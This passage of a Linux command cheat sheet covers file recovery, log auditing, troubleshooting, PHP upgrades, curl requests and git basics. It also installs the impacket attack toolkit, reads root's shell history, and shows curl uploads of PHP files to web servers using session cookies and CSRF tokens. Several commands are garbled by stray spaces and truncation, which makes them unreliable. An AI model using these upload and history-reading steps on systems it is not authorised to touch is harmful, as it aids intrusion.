apt-get install testdisk
which testdisk
```

Then run it

```
sudo testdisk
```

In the next screen, select \[create] Then select the disk from which you want to restore files and select \[proceed] After Testdisk brings you to the prompt where to select the partition, select \[undelete]

### Logs

#### Auditing authentication logs

```
# tail /var/log/auth. log
# grep -i "fail" /var/log/auth. log
```

#### Auditing User login logs in Ubuntu

```
tail /var/
```

#### Auditing samba activity

```
grep -i samba /var/log/syslog
```

#### Auditing cron job logs

```
grep -i cron /var/log/syslog
```

#### Auditing sudo logs

```
grep -i sudo /var/log/auth. log
```

#### Filtering 404 logs in Apache

```
grep 404 apache-logs.log | grep -v -E
"favicon. ico I robots. txt"
```

#### Auditing files requested in Apache

```
head access_log | awk '{print $7}'
```

#### View root user command history

```
# cat /root/.*history
```

#### View last logins

```
last
```

## Troubleshooting

### Fixing No space left on device

#### solution 1

see which processes have opened descriptors to deleted files. You can restart the process and the space will be freed.

```
lsof | grep deleted
```

Or

```
 pushd /proc ; for i in [1-9]* ; do ls -l $i/fd | grep "(deleted)" && (echo -n "used by: " ; ps -p $i | grep -v PID ; echo ) ; done ; popd
```

#### solution 2

if you are using docker

```
docker system prune
```

### Fixing black screen before login

#### solution 1

1. While system booting menu (Grub) type e to edit the first grub line
2. Find the line that starts with linux and ends with quiet. Add nomodeset after the word quiet.
3. You should be able to boot into the GUI
4. Do an "apt-get update" and "apt-get upgrade" from the command line.
5. Find and install the video drivers for your specific video card.

#### solution 2

Hold ALT+CTRL+F1 or F2 and login and execute below:

```
Depending on the type of the display manager: 
sudo dpkg-reconfigure gdm3
or
sudo dpkg-reconfigure sddm

sudo reboot
```

#### solution 3

```
startx
or
service sddm start
or
service gdm3 start
```

#### solution 4

```
`systemctl stop sddm`  
`systemctl disable sddm`  
`systemctl enable sddm`
sudo reboot
```

#### solution 5

```
docker system prune
sudo apt-get install dbus-x11
sudo apt-get install kde-plasma-desktop
```

### Fixing Debian Stretch Sources Problem

```
sed -i s/deb.debian.org/archive.debian.org/g /etc/apt/sources.list
```

### PHP operations

#### Upgrade php

**Debian** \[1] Execute the below commands

```
sudo apt install apt-transport-https lsb-release ca-certificates wget -y

sudo wget -O /etc/apt/trusted.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg 

sudo sh -c 'echo "deb https://packages.sury.org/php/ $(lsb_release -sc) main" > /etc/apt/sources.list.d/php.list'

sudo apt update
```

\[2] Execute the below commands to install the new version of PHP

```
sudo apt update
sudo apt -y install php7.[VERSION-NUMBER]
apt install php7.4-fpm
apt install php7.4-mysql
apt install php7.4-mbstring
apt install php7.4-gd
apt install php7.4-intl
apt install php7.4-bz2
apt install php7.4-bcmath
```

\[3] Disable the old version and enable the new one

```
sudo a2dismod php7.0
sudo a2enmod php7.4
```

\[4] Restart apache

```
Sudo /etc/init.d/apache2 restart
```

\[5] old versions

```
Sudo apt purge php7.0 php7.0-common
sudo apt remove php8.0-cli
apt-get autoremove php7.0
```

**Ubuntu** \[1] Execute the below commands

```
root:~$:sudo apt -y install lsb-release apt-transport-https ca-certificates

root:~$:sudo wget -O /etc/apt/trusted.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg

root:~$:sudo apt install software-properties-common

root:~$:sudo add-apt-repository ppa:ondrej/php
```

or: replaces only the fourth command above

```
root@Red-hat:~$:echo "deb https://packages.sury.org/php/ $(lsb_release -sc) main" | sudo tee /etc/apt/sources.list.d/php.list

root@Red-hat:~$:wget -qO - https://packages.sury.org/php/apt.gpg | sudo apt-key add -
```

\[2] Execute the below commands to install the new version of PHP

```
sudo apt update
sudo apt -y install php7.[VERSION-NUMBER]
apt install php7.4-fpm
apt install php7.4-mysql
apt install php7.4-mbstring
apt install php7.4-gd
apt install php7.4-intl
apt install php7.4-bz2
apt install php7.4-bcmath
```

\[3] Disable the old version and enable the new one

```
sudo a2dismod php7.0
sudo a2enmod php7.4
```

\[4] Restart apache

```
Sudo /etc/init.d/apache2 restart
```

\[5] old versions

```
Sudo apt purge php7.0 php7.0-common
sudo apt remove php8.0-cli
apt-get autoremove php7.0
```

#### Install PhpMyAdmin

```
sudo apt-get install phpMyAdmin php-mbstring php-gettext

sudo ln -s /etc/phpmyadmin/apache.conf /etc/apache2/conf-available/phpmyadmin.conf

sudo a2enconf phpmyadmin.conf

sudo systemctl restart apache2
```

#### Installing Zlib Extension

```
apt-get update && apt-get install libgcrypt11-dev zlib1g-dev
```

Then

```
nano /etc/php.ini
```

Make sure that

```
zlib.output_compression = On
zlib.output_compression_level = 6
```

#### Upgrade to 8.0

\[1]

```
root@Red-hat:~$:sudo apt -y install lsb-release apt-transport-https ca-certificates
```

\[2]

```
root@Red-hat:~$:sudo wget -O /etc/apt/trusted.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg
```

\[3]

```
root@Red-hat:~$:sudo apt install software-properties-common
```

\[4]

```
root@Red-hat:~$:sudo add-apt-repository ppa:ondrej/php
```

or: replaces only the fourth command

```
root@Red-hat:~$:echo "deb https://packages.sury.org/php/ $(lsb_release -sc) main" | sudo tee /etc/apt/sources.list.d/php.list
```

Execute the following

```
root@Red-hat:~$:sudo apt update
root@Red-hat:~$:sudo apt install php8.0 libapache2-mod-php8.0
root@Red-hat:~$:sudo systemctl restart apache2
Integrate with php-fpm
root@Red-hat:~$:sudo apt install php8.0-fpm libapache2-mod-fcgid
root@Red-hat:~$:sudo a2enmod proxy_fcgi setenvif
root@Red-hat:~$:sudo a2enconf php8.0-fpm
root@Red-hat:~$:systemctl restart apache2
```

#### Installing mysql

First we check the php version

```
php -v
```

lets assume it's 7.0 then the next step is executing the below commands

```
apt-get update
apt-get install php7.0-mysql
```

or

```
apt-get update
apt-get install php-mysql
```

Lastly restart apache

```
root@Red-hat:~$:systemctl restart apache2
```

#### Installing intl extension

For redhat distributions:

```
yum install ea-php74-php-intl -y
```

### Python operations

Installing impacket library

```
sudo git clone https://github.com/SecureAuthCorp/impacket.git) /opt/impacket

sudo pip3 install -r /opt/impacket/requirements.txt

sudo python3 ./setup.py install
```

### The Curl command

#### Downloading files

Downloading a file while specifying the cookie. In this scenario, the file can only be downloaded if the user is logged in and assigned a cookie therefore we use the below command to download the intended file. You can find the values of \[cookie-variable] and \[cookie-value] using the browser developer tool

```
 curl -s -XGET -b 'cookie-variable=cookie-value' http://domain.com/file.exe
```

#### Performing uploads to a webserver

**Authentication is required with username and password**

Uploading files often require authentication.With curl -X \[put] is used to upload files, \[-T] and to specify file path and \[-u] to specify username and password.

```
curl -X PUT -T [path-to-file-to-be-uploaded] http://domain.com/file.php -u [username:pass]
```

**Authentication is required with a Cookie and CSRF Token**

\#The \[-F] is used to specify form data. Be sure to include other form data in the command with \[-F] if the upload form uses more than one field. #The \[u] is the parameters used to control the uploaded files change it according to your scenario. #The \[token] is the CSRF token. #The \[-H] is used to specify the token.

```
curl -X POST -F "u=@file.zip" -F "token=b6ab6ff4586a56cc35gv64238be8d1f5efd324c2dceb7f216c512fdea8b17a5e" -F "submit=Upload" 
-H "Cookie: admin=1; PHPSESSID=v67bdra1sff97oi3bhpj95m7e4 http://domain.com/?file=upload
```

#### Performing POST requests

```
curl http://domain.com -X POST 
```

#### Changing user agent

```
curl http://domain.com -A [desired-useragent]
```

### Working with GIT Repos

#### Cloning a repo

```
git clone [url]
```

#### Viewing history of commits

```
git log
```

We can also use the option \[-p] to show the differences introduced in each commit

#### Viewing the repo branches

```
git branch -r
```

#### choosing a branch

After listing the branch names from the above commands, we can then checkout the selected branch with the command below

```
git checkout [branch-name]
```

Then we can issue the below command again

```
git branch
```

#### Viewing tagged history items

```
git tag
```

If there are tagged specific tag points it will show up in the output. You can then view its content with the command below

```
git show [tag-name]
```

#### pushing files to a repo

First we login to the repo using \[ssh] if available then we retrieve the available branches. We create the file

```
touch file.txt
```

We make sure there is no \[.gitignore] as it may cause errors

```
rm .gitignore
```

We upload the file

```
git add file.txt
```

We commit the changes

```
git commit -m "put whatever you like here"
```

Lastly we make the push to origins

```
git push origin master
```
